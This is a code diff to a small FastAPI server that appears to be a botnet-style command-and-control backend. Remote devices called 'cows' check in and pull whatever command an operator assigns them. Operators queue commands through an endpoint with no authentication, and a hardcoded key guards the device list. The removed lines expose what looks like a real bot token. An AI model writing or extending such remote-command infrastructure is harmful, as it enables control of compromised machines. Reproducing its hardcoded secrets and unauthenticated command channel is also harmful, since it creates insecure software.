@@ -1,10 +1,12 @@
 from fastapi import FastAPI
+from dotenv import load_dotenv
+import os
 
 app = FastAPI()
 
 clients = {
-    "cow1": {"name": "example", "command": "command here","status": "online"},
-    "cow2": {"name": "example2", "command": "command here","status": "offline"}
+    "cow1": {"name": "example", "command": "command here", "status": "online"},
+    "cow2": {"name": "example2", "command": "command here", "status": "offline"}
 }
 
 name_to_id = {
@@ -12,39 +14,46 @@ name_to_id = {
     "example2": "cow2"
 }
 
-
 def newDevice(device_name):
     if device_name in name_to_id:
-        print("doing nothing")
+        print("[~] Device already known.")
         return
 
-    cowID = f"cow{len(clients)+1}"
+    cowID = f"cow{len(clients) + 1}"
     clients[cowID] = {
         "name": device_name,
-        "command": ""
+        "command": "",
+        "status": "online"
     }
     name_to_id[device_name] = cowID
+    print(f"[+] Registered new device: {device_name} as {cowID}")
 
-def assignCommands(id,command):
-    clients[id]["command"] = command
+def assignCommands(id, command):
+    if id in clients:
+        clients[id]["command"] = command
+        print(f"[+] Assigned command to {id}: {command}")
+    else:
+        print(f"[!] Tried to assign command to unknown cow: {id}")
 
 @app.get("/ping/{device_name}")
 async def ping(device_name: str):
     print(f"[+] Ping received from: {device_name}")
     newDevice(device_name)
-    return {"status": "ok", "command":clients[name_to_id[device_name]]["command"]}
+    cow_id = name_to_id[device_name]
+    return {"status": "ok", "command": clients[cow_id]["command"]}
 
 @app.get("/command/listcows/{key}")
-async def listcows(key):
-    if key == "MTM2NzQ5MzA2NjYwMDA5MTY3OA.G6M2QA.T7yP_Wv3nFpyHF5VaanrLc0yT-Nx4VUAOykqJc":
-        print(f"[+] Command received form server to list all cows.")
-        data = [(id,info["name"]) for id, info, in clients.items()]
+async def listcows(key: str):
+    if key == "NoOneIsAroundToHelp":
+        print("[+] Listing all cows.")
+        data = [(id, info["name"]) for id, info in clients.items()]
         return {"auth": "ok", "cows": data}
     else:
+        print("[!] Unauthorized list request.")
         return {"auth": "failed"}
 
 @app.get("/command/{cow},{command}")
-async def command(cow, command):
-    print(f"[+] Command received for server for {cow}, {command}")
+async def command(cow: str, command: str):
+    print(f"[+] Received command: '{command}' for cow: {cow}")
     assignCommands(cow, command)
     return {"status": "ok"}
